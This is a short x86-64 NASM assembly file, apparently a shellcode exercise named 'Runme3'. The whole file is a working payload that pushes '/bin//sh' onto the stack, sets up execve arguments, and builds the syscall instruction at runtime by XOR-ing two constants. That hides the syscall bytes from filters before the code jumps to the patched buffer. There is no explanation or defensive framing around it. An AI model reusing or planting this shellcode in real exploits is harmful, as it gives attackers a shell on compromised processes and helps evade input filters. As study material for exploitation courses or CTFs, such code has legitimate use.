[bits 64]

mov rcx,rax
xor rdx, rdx
push rdx
mov rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
xor rax, rax
mov al, 0x3b
mov ax, 0xeeee
xor ax, 0xebe1
mov [rcx], rax
xor rax, rax
mov al, 0x3b
push rcx
ret

; nasm Runme3.nasm